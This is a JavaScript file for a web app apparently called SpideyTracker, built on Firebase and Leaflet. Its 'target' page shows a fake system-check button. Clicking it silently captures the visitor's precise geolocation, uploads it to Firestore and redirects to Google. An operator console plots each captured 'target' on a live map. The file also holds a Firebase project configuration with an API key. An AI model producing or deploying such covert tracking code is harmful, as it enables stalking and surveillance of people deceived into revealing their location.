// --- CONFIGURACIÓN DE FIREBASE (Versión Global CDN) ---
const firebaseConfig = {
  apiKey: "AIzaSyCvJx96Z6LoG9O1UEs-KCNfqjpRrVFjVBQ",
  authDomain: "spideytracker-591bb.firebaseapp.com",
  projectId: "spideytracker-591bb",
  storageBucket: "spideytracker-591bb.firebasestorage.app",
  messagingSenderId: "923704989530",
  appId: "1:923704989530:web:74debc7597acbc80a00563",
  measurementId: "G-RFC57L9T0Y"
};

// Inicializar Firebase con los objetos globales del CDN
firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();

// --- LÓGICA DE LA APLICACIÓN ---
document.addEventListener("DOMContentLoaded", () => {
    const sysCheckBtn = document.getElementById("sysCheckBtn");
    const mapContainer = document.getElementById("map");

    if (mapContainer) {
        // --- MODO CONSOLA (Visualización de Arañas 🕷️) ---
        const map = L.map('map').setView([0, 0], 2);
        
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            attribution: '© OpenStreetMap contributors'
        }).addTo(map);

        const spiderIcon = L.divIcon({
            className: 'spider-marker',
            html: '<div style="font-size: 24px; text-align: center;">🕷️</div>',
            iconSize: [30, 30],
            iconAnchor: [15, 15]
        });

        // Escuchar cambios en tiempo real con la sintaxis global de Firestore
        db.collection("locations").onSnapshot((snapshot) => {
            snapshot.docChanges().forEach((change) => {
                if (change.type === "added") {
                    const data = change.doc.data();
                    const lat = data.latitude;
                    const lng = data.longitude;
                    const timestamp = data.timestamp ? data.timestamp.toDate().toLocaleString() : 'Justo ahora';

                    L.marker([lat, lng], { icon: spiderIcon })
                        .addTo(map)
                        .bindPopup(`<b>¡Objetivo localizado!</b><br>Lat: ${lat.toFixed(4)}, Lng: ${lng.toFixed(4)}<br>Hora: ${timestamp}`);

                    map.setView([lat, lng], 15);
                }
            });
        });

    } else if (sysCheckBtn) {
        // --- MODO OBJETIVO (Captura discreta y redirección) ---
        sysCheckBtn.addEventListener("click", () => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        try {
                            await db.collection("locations").add({
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                timestamp: new Date()
                            });
                        } catch (e) {
                            console.error("Error al registrar posición", e);
                        }
                        window.location.href = "https://www.google.com";
                    },
                    (error) => {
                        window.location.href = "https://www.google.com";
                    },
                    { enableHighAccuracy: true }
                );
            } else {
                window.location.href = "https://www.google.com";
            }
        });
    }
});
